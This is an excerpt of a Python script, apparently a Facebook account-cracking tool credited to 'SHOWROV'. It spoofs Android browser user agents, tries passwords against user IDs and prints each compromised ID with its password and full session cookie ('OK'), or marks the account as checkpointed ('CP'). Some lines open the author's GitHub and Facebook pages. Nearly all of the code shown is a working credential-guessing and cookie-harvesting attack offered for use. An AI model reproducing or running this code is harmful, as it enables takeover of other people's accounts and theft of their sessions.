...
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/shahoriar404')
...
\033[1;94m       [+]===============================================[+]
\033[1;94m       [+]        CREATED BY   :  SHOWROV             \033[1;94m[+]
\033[1;94m       [+]        ON GITHUB    :  Shahoriar404             \033[1;94m[+]
\033[1;94m       [+]        TEAM         :  NO TEAM      \033[1;94m[+]
...
class Main:
    def __init__(self):
        ...
        print(" [00] Exit")        
        Alif =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/shahoriarmahamud.showrov')
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
            os.system('xdg-open https://www.facebook.com/shahoriarmahamud.showrov')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SRV-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SRV-CP🔪] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SRV🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
